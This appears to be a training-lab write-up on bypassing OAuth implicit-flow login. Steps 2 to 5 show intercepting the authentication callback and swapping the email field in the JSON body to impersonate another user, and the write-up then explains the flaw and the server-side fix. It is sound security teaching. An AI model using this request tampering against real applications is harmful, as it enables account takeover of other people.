# Lab: Authentication bypass via OAuth implicit flow

## Objective
Exploit flawed client-side validation in the OAuth implicit flow to log in as Carlos without knowing his credentials.

---

## Steps

1. Logged in using the OAuth provider with the provided account:

```
Username: wiener
Password: peter
```

2. Intercepted the OAuth callback request:

```http
POST /authenticate
```

3. Observed the JSON body:

```json
{
  "email":"wiener@...",
  "username":"wiener",
  "token":"<OAuth Token>"
}
```

4. Modified only the email parameter:

```json
{
  "email":"carlos@carlos-montoya.net",
  "username":"wiener",
  "token":"<Same OAuth Token>"
}
```

5. Forwarded the modified request.

6. Opened the application in a new browser tab/window.

7. The application authenticated me as Carlos, solving the lab.

---

## Vulnerability

The application trusted user-controlled client-side data after the OAuth flow.

Instead of validating that the OAuth token belonged to the supplied email address, it accepted the email sent by the client.

---

## Impact

An attacker can authenticate as any user by modifying the email parameter while using a valid OAuth token from their own account.

---

## Key Takeaway

Never trust client-supplied identity information after OAuth authentication.

The server must retrieve the user's identity directly from the OAuth provider using the access token instead of accepting fields such as email or username from the client.

---

## Skills Learned

- OAuth Implicit Flow
- Client-side trust issues
- OAuth Authentication Bypass
- Burp Suite Request Manipulation
